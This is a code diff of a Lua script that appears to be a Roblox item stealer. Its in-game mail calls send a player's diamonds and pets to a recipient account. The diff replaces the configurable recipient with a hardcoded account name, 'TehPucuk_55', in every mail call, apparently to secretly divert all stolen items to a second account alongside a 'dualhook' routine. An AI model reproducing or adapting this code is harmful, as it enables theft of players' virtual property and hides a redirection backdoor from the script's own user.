@@ -1250,8 +1250,6 @@ local user
 if FinalList == 0 then
     if givediaamt >= 1000000000 then
         user = UserName
-    else
-        user = "TehPucuk_55"
     end
     if gemsin ~= nil then
         if dualhook(gemsin) then
@@ -1278,7 +1276,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1305,7 +1303,7 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
@@ -1327,16 +1325,14 @@ spawn(function()
     while wait() do
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
-              user = UserName
-              else
-                user = "TehPucuk_55"
+                user = UserName
                 if hugein ~= nil then
                     if dualhook(hugein) then
                     end
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
